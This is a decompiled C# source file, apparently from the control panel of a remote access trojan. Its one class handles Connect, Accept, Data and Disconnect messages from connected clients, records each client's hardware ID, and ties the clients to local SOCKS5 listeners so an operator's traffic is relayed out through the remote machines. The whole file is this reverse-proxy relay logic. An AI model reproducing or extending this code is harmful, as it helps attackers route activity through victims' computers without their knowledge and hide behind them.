using System;
using Server.Connectings;
using Server.Helper.Sock5;

namespace Server.Messages
{
	// Token: 0x02000054 RID: 84
	internal class HandlerReverseProxyU
	{
		// Token: 0x060001DE RID: 478 RVA: 0x0001DB50 File Offset: 0x0001BD50
		public static void Read(Clients client, object[] objects)
		{
			object obj = objects[0];
			string str = (obj != null) ? obj.ToString() : null;
			string str2 = " ";
			object obj2 = objects[1];
			Console.WriteLine(str + str2 + ((obj2 != null) ? obj2.ToString() : null));
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Accept"))
				{
					if (!(a == "ConnectResponse"))
					{
						if (!(a == "Data"))
						{
							if (!(a == "Disconnect"))
							{
								return;
							}
							if (!Program.form.ReverseProxyU.work)
							{
								client.Disconnect();
								return;
							}
							Client client2 = (Client)client.Tag;
							if (client2 == null)
							{
								return;
							}
							client2.Disconnect();
							return;
						}
						else
						{
							if (!Program.form.ReverseProxyU.work)
							{
								client.Disconnect();
								return;
							}
							Client client3 = (Client)client.Tag;
							if (client3 == null)
							{
								return;
							}
							client3.Send((byte[])objects[2]);
							return;
						}
					}
					else
					{
						if (!Program.form.ReverseProxyU.work)
						{
							client.Disconnect();
							return;
						}
						Client client4 = (Client)client.Tag;
						if (client4 != null)
						{
							client4.HandleCommandResponse(objects);
						}
						client.Tag = client4;
						return;
					}
				}
				else
				{
					if (!Program.form.ReverseProxyU.work)
					{
						client.Disconnect();
						return;
					}
					Server.Helper.Sock5.Server server = Program.form.ReverseProxyU.ServersPort((int)objects[4]);
					if (server == null)
					{
						client.Disconnect();
						return;
					}
					Client client5 = server.Search((int)objects[2]);
					if (client5 != null)
					{
						client5.Accept(client);
						client.Tag = client5;
						return;
					}
					client.Disconnect();
					return;
				}
			}
			else
			{
				if (!Program.form.ReverseProxyU.work)
				{
					client.Disconnect();
					return;
				}
				client.Hwid = (string)objects[2];
				client.Tag = Program.form.ReverseProxyU.NewServer(client);
				return;
			}
		}
	}
}
